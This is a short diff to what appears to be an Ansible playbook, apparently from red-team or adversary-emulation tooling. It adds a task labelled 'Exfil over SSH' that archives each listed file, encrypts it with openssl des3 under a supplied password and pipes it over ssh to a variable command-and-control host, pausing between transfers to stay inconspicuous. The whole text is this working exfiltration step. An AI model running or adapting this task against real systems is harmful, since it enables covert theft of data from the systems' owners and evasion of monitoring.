@@ -28,4 +28,8 @@
     - name: Exfil over SSH
       tags: always
       shell: |
-        cd {{ exfiltration_folder }}
+        tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'
+        sleep {{ exfil_delay }}
+      with_items: "{{ exfil_files_list.stdout_lines }}"
+      args:
+        chdir: "{{ exfiltration_folder }}"
